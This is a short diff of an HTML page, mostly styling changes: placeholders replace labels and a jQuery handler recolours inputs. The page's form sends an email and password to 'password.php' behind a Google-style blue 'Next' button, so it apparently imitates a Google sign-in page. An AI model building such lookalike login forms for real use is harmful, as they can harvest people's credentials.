@@ -9,8 +9,10 @@
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
     <script type="text/javascript">
     $(document).ready(function() {
-        $('button').on('click', function() {
-            $('.google').hide();
+        $('input').on('click', function() {
+            $(this).css({
+                'color': '#404040'
+            });
         });
     });
     </script>
@@ -23,13 +25,12 @@
         <div class="test">
             <img class="people" src="test.jpg" alt="">
             <form action="password.php" method="post">
-                E-mail
                 <br>
-                <input type="text" style="" name="Email">
+                <input type="text" style="color:#999; font-size: 18px;" placeholder="Email" name="Email">
                 <br>
-                <br> Password
                 <br>
-                <input type="password" style="" name="password">
+                <br>
+                <input type="password" style="color:#999; font-size: 18px;" placeholder="Password" name="password">
                 <br>
                 <input type="submit" name="test" value="下一步" style="background:none;border:none;background-color: #357ae8;color:#fff;margin: 20px 0 10px 0;padding: 4.9px; font-size:20px;border-radius: 3px; height: 40px;">
             </form>
